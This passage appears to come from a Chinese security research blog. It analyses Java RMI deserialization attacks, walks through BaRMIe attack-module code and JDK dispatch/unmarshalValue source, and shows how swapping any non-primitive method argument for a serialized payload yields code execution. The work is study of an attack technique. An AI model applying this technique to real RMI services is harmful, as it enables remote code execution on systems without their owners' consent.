class="line">		fbs = (FileBrowserStub)<span class="keyword">this</span>.getRemoteObject(ep, <span class="string">"fileBrowser"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//调用listFilesOnServer方法获取调用结果</span></span><br><span class="line">		files = fbs.listFilesOnServer(path);</span><br><span class="line">			</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************************</span></span><br><span class="line"><span class="comment"> * FileBrowserStub for AxiomSL attacks.</span></span><br><span class="line"><span class="comment"> **********************************************************/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">interface</span> <span class="title">FileBrowserStub</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">abstract</span> FileInformation[] listFilesOnServer(String paramString) <span class="keyword">throws</span> RemoteException;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">byte</span>[] readFile(String paramString, <span class="keyword">long</span> paramLong, <span class="keyword">int</span> paramInt) <span class="keyword">throws</span> IOException;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">writeFile</span><span class="params">(String paramString, <span class="keyword">byte</span>[] paramArrayOfByte)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">boolean</span> <span class="title">deleteFile</span><span class="params">(String paramString, <span class="keyword">boolean</span> paramBoolean)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> FileInformation <span class="title">getFileInformation</span><span class="params">(String paramString)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那这边也就清楚了，实际上探测利用开放的RMI服务，根本只是攻击者自己知道有哪些组件会提供危险的RMI服务。然后根据class路径去判断对面是否使用了该组件，如果用了就尝试打一打看看成不成功。</p>
<p>假如对面提供了我们一个不认识的RMI服务，我们是没有能力攻击的。</p>
<p>就如之前提到的一样：因为我们没有RMI服务对象的接口（方法+参数）。就算对面开放了一个Class名字可疑的服务，我们也没有办法去正确调用它。</p>
<p>可见这种理论存在但是不怎么被人讨论的攻击方法总是有些鸡肋。</p>
<h2 id="RMI客户端反序列化攻击RMI服务端"><a href="#RMI客户端反序列化攻击RMI服务端" class="headerlink" title="RMI客户端反序列化攻击RMI服务端"></a>RMI客户端反序列化攻击RMI服务端</h2><p>那么再看之前的工具中的第二类攻击形式——RMI客户端反序列化攻击RMI服务端</p>
<h3 id="利用Object类型参数"><a href="#利用Object类型参数" class="headerlink" title="利用Object类型参数"></a>利用Object类型参数</h3><p>3个攻击模块都是利用有Object类型参数的接口，来传入Object类型的payload，在RMI服务端对Object类型的参数进行反序列化时，触发payload来完成反序列化攻击的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java</span><br><span class="line">	-JmxDeser</span><br><span class="line">SpringFramework</span><br><span class="line">	-RmiInvocationHandlerDeser</span><br><span class="line">	-Spring2RmilnvocationHandlerDeser</span><br></pre></td></tr></table></figure>
<p>这三个攻击模块同样是针对特定的组件提供的RMI服务，在判断是否存在漏洞时，代码会去判断RMI服务返回的对象的class栈是否存在以下class路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">javax.management.remote.rmi.RMIServer</span><br><span class="line">org.springframework.remoting.rmi.RmiInvocationWrapper_Stub</span><br><span class="line">org.springframework.remoting.rmi.RmiInvocationHandler</span><br></pre></td></tr></table></figure>
<p><strong>利用Object类型参数</strong>跟探测利用开放的RMI服务一样，也是假如对面自实现了RMI服务，我们没有接口的话就两眼摸黑，无法下手。</p>
<p>还是继续看看BaRMIe是怎么攻击的，以Spring RMI服务为例。</p>
<p>描述：Spring RMI Remoting使用invoke（）方法公开一个远程类，该方法接受一个RemoteInvocation对象作为参数。RemoteInvocation对象有一个可以保存任何对象的属性，从而启用反序列化攻击。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//nb.barmie.modes.attack.attacks.Java.JMXDeser#executeAttack	</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeAttack</span><span class="params">(RMIEndpoint ep, DeserPayload payload, String cmd)</span> <span class="keyword">throws</span> BaRMIeException </span>&#123;</span><br><span class="line">		RMIServer obj;</span><br><span class="line">    	<span class="comment">//eq是RMI服务</span></span><br><span class="line">		<span class="comment">//payload是选取的payload种类</span></span><br><span class="line">    	<span class="comment">//cmd是我们要在目标执行的命令</span></span><br><span class="line">		<span class="comment">//开始攻击</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">//建立代理rmi服务，等会我们去看看内部做了什么</span></span><br><span class="line">			System.out.println(<span class="string">"\n[~] Getting proxied jmxrmi object..."</span>);</span><br><span class="line">			obj = (RMIServer)<span class="keyword">this</span>.getProxiedObject(ep, <span class="string">"jmxrmi"</span>, payload.getBytes(cmd, <span class="number">0</span>));</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//调用newClient()方法,传入一个固定默认的object</span></span><br><span class="line">			System.out.println(<span class="string">"[+] Retrieved, invoking newClient(PAYLOAD)..."</span>);</span><br><span class="line">			obj.newClient(<span class="keyword">this</span>.DEFAULT_MARKER_OBJECT);</span><br><span class="line">		&#125; <span class="keyword">catch</span>(Exception ex) &#123;</span><br><span class="line">			<span class="comment">//Check the exception for useful info</span></span><br><span class="line">			<span class="keyword">this</span>.checkDeserException(ex);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>跟进this.getProxiedObject</p>
<p><code>nb.barmie.modes.attack.RMIDeserAttack#getProxiedObject(nb.barmie.modes.enumeration.RMIEndpoint, java.lang.String, byte[])</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title">getProxiedObject</span><span class="params">(RMIEndpoint ep, String name, <span class="keyword">byte</span>[] payload)</span> <span class="keyword">throws</span> BaRMIeException </span>&#123;</span><br><span class="line">    <span class="comment">//需要注意此处的this.DEFAULT_MARKER_OBJECT_BYTES</span></span><br><span class="line">    <span class="comment">//与obj.newClient(this.DEFAULT_MARKER_OBJECT)中的内容一致，等同于一个占位符的感觉</span></span><br><span class="line">    <span class="comment">//这边是从ep（rmi服务端）端中获取了名字为name的对象，做代理</span></span><br><span class="line">    <span class="comment">//同时在代理之后所有的通讯的同时，会将this.DEFAULT_MARKER_OBJECT_BYTES替换为payload</span></span><br><span class="line">    <span class="comment">//从而实现不同的payload的动态注入</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getProxiedObject(ep, name, payload, <span class="keyword">this</span>.DEFAULT_MARKER_OBJECT_BYTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到实际利用就是直接去服务端lookup获取这个<strong>jmxrmi</strong>对象，获取到了就调用<strong>newClient(Object a)</strong>这个方法，然后用自己的payload替换这个a就可以了。</p>
<p>与我们预想中的一样，也不是啥rmi服务都能打的。如果不知道对面接口、参数，对方那又不存在自己已知的用Object参数的rmi服务接口（class判断），就直接GG。</p>
<p>同样局限很大，但是相对于探测利用开放的RMI服务，这个稍微要求低点，不要求对方功能有害，只要有一个已知有Object参数的方法接口就行。但是，这里作为一个反序列化点，要利用，还需要服务器有利用链才行。</p>
<h4 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h4><p>我们之前默认了这个Object参数肯定会在服务端反序列化，虽然事实也是如此，但是我们来看一下到底在服务端是如何反序列化的。这将对我们接下来的漏洞理解有帮助，毕竟之后都是看源码。</p>
<blockquote>
<p>github：RMI-Client Client 攻击 RMI-Server ServerAndRegister 【没用BaRMIe打是因为，那边的环境比较复杂，自己写个参数简单点】</p>
<p> jdk:1.7u80【这边使用的CC payload是1.7下的】</p>
<p>反序列化链：cc3.2.1</p>
</blockquote>
<p>服务端在下面的dispatch方法中下断点，开启调试，客户端直接运行攻击服务端，就会到断点处</p>
<p><code>rt.jar.sun.rmi.server.UnicastServerRef#dispatch</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dispatch</span><span class="params">(Remote var1, RemoteCall var2)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">long</span> var4;</span><br><span class="line">        ObjectInput var40;</span><br><span class="line">        <span class="comment">//---------第一个try--------</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var40 = var2.getInputStream();</span><br><span class="line">            <span class="keyword">int</span> var3 = var40.readInt();</span><br><span class="line">            <span class="keyword">if</span> (var3 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//在正式接受参数前解析前，会进入几次这个if函数，虽然不知道干了啥，估计是一些固定通讯</span></span><br><span class="line">                <span class="comment">//但是在接受参数，进行解析执行参数的dispatch，不会进入这个if</span></span><br><span class="line">                <span class="comment">//所以第一个try这里其实没做什么，就在下main读取了一个Method hash</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.skel != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.oldDispatch(var1, var2, var3);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"skeleton class not found but required for client version"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">		   <span class="comment">//var4是从客户端传输过来的序列化数据中读取客户端调用的Method hash</span></span><br><span class="line">            var4 = var40.readLong();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var36) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling call header"</span>, var36);</span><br><span class="line">        &#125;</span><br><span class="line">	   <span class="comment">//--------第一个try结束---------</span></span><br><span class="line">        MarshalInputStream var39 = (MarshalInputStream)var40;</span><br><span class="line">        var39.skipDefaultResolveClass();</span><br><span class="line">        <span class="comment">//通过客户端提供的var4去验证客户端想要调用的方法，在这里有没有</span></span><br><span class="line">        Method var8 = (Method)<span class="keyword">this</span>.hashToMethod_Map.get(var4);</span><br><span class="line">        <span class="comment">//如果没有就报错你想调用的方法在这里不存在。</span></span><br><span class="line">        <span class="keyword">if</span> (var8 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"unrecognized method hash: method not supported by remote object"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>来看看这边服务端的hashToMethod_Map长啥样，就是我们在服务端实现的RMI服务对象的三个方法。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16s5z34uj31hh04pgmn.jpg" alt="hashToMethod_Map.png"></p>
<p><strong>之前开过一个脑洞</strong>：</p>
<p>正常而言是服务端什么接口，客户端就用什么接口，比如<code>name(java.lang.String)</code></p>
<p>如果我们在客户端强行把<code>name(java.lang.String)</code>的方法接口写成<code>name(java.lang.Object)</code>（因为在客户端，RMI接口类是客户端自己写的，如果把name参数故意写成Object，在客户端调用是不会报错的），尝试无中生有一个Object来让服务端解析，如果这样成功的话，就可以这样是不是就扩大了攻击面了，不是Object的参数就创造一个Object参数出来，让服务端解析？</p>
<p>但是实际上看过源码我们也会发现，会卡死在上面method hash验证这一步的，会报错：<strong>unrecognized method hash</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sdbtxjj31ic125tdv.jpg" alt="没有对象的地方强行用对象.png"></p>
<p>虽然我们知道不行，还是看看具体数据包，打开wireshark，抓个RMI客户端发送参数给RMI服务端的数据包（关于抓包交互流程啥的参考上一篇RMI 反序列化吧，个人是抓的Npcap网卡，无线网卡抓不到本地交互包）：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sla9atj31ev0rm77c.jpg" alt="方法hash1数据包.png"></p>
<p>导出为16进制字符串，把aced反序列化开头前的不要，给serializationdumper分析一下，图中框起来的就是我们客户端传输的method hash</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16sqaqwrj31uz0h1jxf.jpg" alt="方法hash1.png"></p>
<p>对比下服务端分析处的：（服务端调试时，显示的是10进制Long型，写个小DEMO，我们把它调为16进制来对比下）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16svigjdj31el12fdl0.jpg" alt="方法hash1断点.png"></p>
<p>跟我们wireshark获取的完全一致（当然了….）但是这个Method hash，与上面服务端自己实现的method hash map中的值均不符，于是，强行把<code>name(java.lang.String)</code>的方法接口写成<code>name(java.lang.Object)</code>来无中生有一个Object，会因为服务端没有我们传输过去的method hash而失败。</p>
<p>啊噢，脑洞失败。</p>
<p>但是<strong>第二个脑洞</strong>：我们既然都抓到数据包了，反正理论上我们客户端生成的数据包我们可以随意控制，我们可以在method hash的位置正常写一个服务端有的method hash，就可以通过method hash校验了。但是然后传输的参数继续写成Object形式这样可以么？</p>
<p>继续看源码，顺路看看判断这个脑洞可以不，<code>sun.rmi.server.UnicastServerRef#dispatch</code>紧接着上面method hash判定</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.logCall(var1, var8);</span><br><span class="line"><span class="comment">//var8 是在hashToMethod_Map中用客户端传输过来的method hash查询到的RMI服务端实现的Method类型</span></span><br><span class="line"><span class="comment">//获取Method中的入参</span></span><br><span class="line">Class[] var9 = var8.getParameterTypes();</span><br><span class="line"><span class="comment">//获取入参个数，等会拿来存储反序列化结果</span></span><br><span class="line">Object[] var10 = <span class="keyword">new</span> Object[var9.length];</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//这边是JDK提供给开发者自定义的解析部分，默认是一个空函数</span></span><br><span class="line">    <span class="keyword">this</span>.unmarshalCustomCallData(var40);</span><br><span class="line">	<span class="comment">//遍历入参类型</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> var11 = <span class="number">0</span>; var11 &lt; var9.length; ++var11) &#123;</span><br><span class="line">        <span class="comment">//**关键函数**：unmarshaValue(入参类型，传输数据包)</span></span><br><span class="line">        <span class="comment">//这里开始根据 入参类型（var9[var11]） 反序列化 传输过来的序列化入参，然后反序列化结果给var10</span></span><br><span class="line">        var10[var11] = unmarshalValue(var9[var11], var40);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var33) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var33);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException var34) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var34);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    var2.releaseInputStream();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面说到第二个脑洞：关注<strong>unmarshalValue(var9[var11], var40);</strong></p>
<ul>
<li>这里我们客户端传输的Object类型恶意参数在var40中</li>
<li>入参类型（var9[var11]）是服务器本地RMI服务Method的设定参数类型</li>
</ul>
<p>这里的处理是没问题的，用本地的Method设定的参数类型去读取客户端提供的输入流。</p>
<p>继续跟进<code>sun.rmi.server.UnicastRef#unmarshalValue</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">//var0 是服务端Method设定的入参参数类型</span></span><br><span class="line">    <span class="comment">//var1 是传输从客户端来的的序列化数据流</span></span><br><span class="line">    <span class="comment">//var0.isPrimitive 判断是否是默认基础类型</span></span><br><span class="line">    <span class="comment">//需要注意基础类型!=下面这些TYPE，我们在之后解释这个坑</span></span><br><span class="line">    <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readInt();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readByte();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readChar();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readShort();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readLong();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readFloat();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readDouble();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Unrecognized primitive type: "</span> + var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//将从客户端传输过来的序列化数据流进行readObject</span></span><br><span class="line">        <span class="comment">//**反序列化执行处**</span></span><br><span class="line">        <span class="keyword">return</span> var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>var1.readObject();</code>就是<strong>反序列化</strong>我们的Object payload参数的地方。</p>
<p>到这里我们利用Object的类型参数传输payload的漏洞触发点就跟完了，主要就以下步骤</p>
<ol>
<li>根据传输过来的Method hash，判断本地提供的RMI服务类的方法是否有这个Method hash</li>
<li>根据Method hash取到Method类，遍历入参，从输入流按顺序反序列化入参</li>
<li>当服务端设定的RMI方法的入参<strong>不是基础数据类型</strong>时，执行<code>var1.readObject</code>就会触发我们的payload</li>
</ol>
<h3 id="绕过Object类型参数"><a href="#绕过Object类型参数" class="headerlink" title="绕过Object类型参数"></a>绕过Object类型参数</h3><p>上面我们也在一直开脑洞，想要扩大影响范围，但一路分析下来好像看似没什么办法。但是好像有一个地方可以注意到：当服务端设定的RMI方法的入参<strong>不是基础数据类型</strong>时，就会执行反序列化输入流。这里并不强求是要Object类型的参数才能<code>var1.readObject</code>。</p>
<p>这里看似没问题，但是你细品：</p>
<p>假如服务端的RMI方法接口的入参是<code>name(java.lang.String)</code>（<strong>String不在基础数据类型表中</strong>）；那么它就会进入else分支，执行<code>var1.readObject();</code>，但是<code>var1</code>又是我们客户端输出的值，假如我们输入的<strong>不是一个<code>java.lang.String</code>的值</strong>，而是一个<strong>Object对象</strong>，那么实际上也会被反序列化解析，即<code>Object.readObject();</code>完成任意命令执行。</p>
<p>那么：<strong>RMI服务端需要起一个具有Object参数的RMI方法</strong> 的利用条件限制 就扩展到了 <strong>RMI服务端只需要起一个具有不属于基础数据类型参数的RMI方法</strong>（比如String啥的）</p>
<p><strong>攻击原理核心</strong>在于替换原本不是Object类型的参数变为Object类型。之前我们修改String接口变为Object，是可以做到修改参数类型，但是那样还会修改method hash。所以这里只能修改底层代码，去替换原本的参数为我们想要的payload。</p>
<p>afanti总结了以下途径（后发现是<a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">国外老哥</a>先提出来的）：</p>
<ol>
<li>直接修改rmi底层源码</li>
<li>在运行时，添加调试器hook客户端，然后替换</li>
<li>在客户端使用Javassist工具更改字节码</li>
<li>使用代理，来替换已经序列化的对象中的参数信息</li>
</ol>
<p>途径不同，目的都是一样的，我们使用afanti的<a href="https://github.com/Afant1/RemoteObjectInvocationHandler" target="_blank" rel="noopener">RemoteObjectInvocationHandler</a>来试验下可行性。</p>
<p>RMI服务端改成提供一个String参数为接口的方法：<code>say(String say)</code></p>
<p>修改<code>afanti.rasp.visitor.RemoteObjectInvocationHandlerHookVisitor.RemoteObjectInvocationHandlerHookVisitorAdapter#onMethodEnter</code>下的DNS地址为自己的，然后打包成jar。</p>
<p>设置VM options</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tc3gg4j31g80o1di8.jpg" alt="vm options配置.png"></p>
<p>Server调试一下，断点下在入参判断处，然后客户端直接运行。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16thrig4j31j80r7wg7.jpg" alt="String调试.png"></p>
<p>可以看到入参类型为String，但是var1中是Object类型的URLDNS payload</p>
<p>到URLDNS的触发末端下个断点看看<code>java.net.URLStreamHandler#hashCode</code>，已经执行到这了，证明OK。（其实是由于再写文章的时候CEYE莫名其妙挂了，就不补图惹，不了解URLDNS原理的可以看<a href="https://www.anquanke.com/post/id/201762#h3-7" target="_blank" rel="noopener">这里</a>）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tmsyclj31ci0ps405.jpg" alt="URLDNS.png"></p>
<p>其实我们回看<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a>，会发现在其README.md文档中已经对于该类型绕过进行了说明（可能这就是大佬吧.jpg）：</p>
<blockquote>
<p>3.通过非法的方法调用进行反序列化攻击</p>
<p>由于在服务器上对于客户端传入参数序列化的同时对于方法的参数并没有进行匹配检查。我们可以使用具有非原始参数类型的任何方法作为反序列化攻击的入口点。BaRMIe通过使用TCP代理在网络级别修改方法参数来实现这一点，实际上触发了非法的方法调用。下面是一些易受攻击方法的示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>;</span><br><span class="line">&gt; <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(Integer i1, Integer i2)</span></span>;</span><br><span class="line">&gt; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span>[] values)</span></span>; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>当方法调用通过代理时，这些方法的参数可以替换为反序列化负载。此攻击是可能的，因为Java在反序列化之前不会尝试验证通过网络接收的远程方法参数是否与实际参数类型兼容。</p>
</blockquote>
<p>这里提到<strong>Integer参数</strong>也是可以利用的，但是想想不科学呀，Integer不是在if为true的情况下么？我们回看下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;<span class="comment">//这里</span></span><br><span class="line">        <span class="keyword">return</span> var1.readInt();</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>查一下<a href="http://www.51gjie.com/java/778.html" target="_blank" rel="noopener">isPrimitive()</a>是判断是否为基本类，包括基本类型boolean、char、byte、short、int、long、float、double。而Integer是int的封装类，不是一个基本类，所以Interger的参数也可以？</p>
<p>试一试：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tuhpwfj31200gjq42.jpg" alt="Integer调试.png"></p>
<p>还真的会到else中……</p>
<p>这里有一个非常坑的烟雾弹，那就是下面的<strong>Integer.TYPE</strong>，真的会很自然的以为Integer.TYPE就是Integer类，那么包括integer类下面的这些类都不行，而实际上<strong>Integer.TYPE</strong>不是Integer类是基础类<strong>int</strong>！！！！！</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16tzrpjcj315d0cvq3x.jpg" alt="Integer-int.png"></p>
<p>那么我们也就可以理解为啥<strong>参数为Integer</strong>是可以的了，因为Integer  !=i nt，不是基础类。</p>
<p>再顺手来验证下<strong>int[]</strong>吧</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16u5qw2ej31370jl3zu.jpg" alt="int[]调试.png"></p>
<p>也进入else，数组的class竟然长这样 因垂丝汀。最后看一个不行的int类型：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uaiz26j30om0m4jt1.jpg" alt="int调试.png"></p>
<blockquote>
<p>这里截图是去掉替换成payload的jar包看到的结果，替换成payload后其实不到这里就会报错退出，没有细究应该是payload的问题。</p>
</blockquote>
<p>那么至此我们也就知道：<strong>假如服务端起一个RMI服务，只要提供了非基础类的参数接口，我们都可以对其进行反序列化攻击。</strong></p>
<p>在相关文章中总结的：</p>
<ul>
<li>Bypass JEP290攻击rmi的 <strong>即使暴露的函数非Object参数类型的，也是可以被攻击的。</strong></li>
<li>RMI漏洞的另一种利用方式的 <strong>如果暴露的函数无Object类型参数，那么就需要动态替换rmi通讯时候函数参数的值</strong></li>
</ul>
<p>感觉都会有些误导说让人迷糊的觉得所有参数都可以，可能是因为这个太简单了？？</p>
<p>回到Barmie工具，它虽然提出了这个绕过Object调用的利用方式，但是是没有为其提供攻击模块。</p>
<p>想想也正常，这个绕过其实在实际场景中也同样有一个鸡肋的前提，客户端要知道服务端起服务的接口以及调用方式，即a.b(c)。</p>
<p>实际利用还是太难了。</p>
<h2 id="RMI服务端反序列化攻击RMI注册端"><a href="#RMI服务端反序列化攻击RMI注册端" class="headerlink" title="RMI服务端反序列化攻击RMI注册端"></a>RMI服务端反序列化攻击RMI注册端</h2><p>上边讲述的三类攻击方式，讨论的人挺少，因为在实际中确实挺鸡肋的，但是搞搞清楚也算有趣。</p>
